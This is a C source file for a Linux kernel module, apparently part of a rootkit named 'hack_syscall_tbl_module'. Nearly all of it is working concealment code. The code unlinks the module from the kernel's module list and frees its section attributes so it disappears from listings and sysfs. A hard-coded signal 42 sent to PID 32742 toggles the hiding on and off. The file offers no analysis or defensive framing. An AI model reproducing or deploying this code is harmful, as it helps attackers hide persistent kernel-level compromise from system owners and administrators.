/*
 * hack_syscall_tbl_module
 * Copyright (C) 2021  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#include <linux/module.h>
#include <linux/slab.h>

#include "hide_proc.h"

#define INVIS_PID 32742
#define INVIS_SIG 42

static struct list_head* p_prev_module = NULL;
static short is_first_hide = 1;
static short is_module_hidden = 0;

static void module_hide(void)
{
    p_prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    is_module_hidden = 1;
}

static void module_show(void)
{
    list_add(&THIS_MODULE->list, p_prev_module);
    p_prev_module = NULL;
    is_module_hidden = 0;
}

void ch_visibility_status(pid_t pid, int sig)
{
    if (pid != INVIS_PID) {
        return;
    }
    if (sig != INVIS_SIG) {
        return;
    }
    
    if (is_module_hidden) {
        // Show module.
        module_show();
    } else {
        // Hide module.
        module_hide();

        if (is_first_hide) {
            is_first_hide = 0;
            kfree(THIS_MODULE->sect_attrs);
            THIS_MODULE->sect_attrs = NULL;
        }
    }
}

#undef INVIS_PID
#undef INVIS_SIG

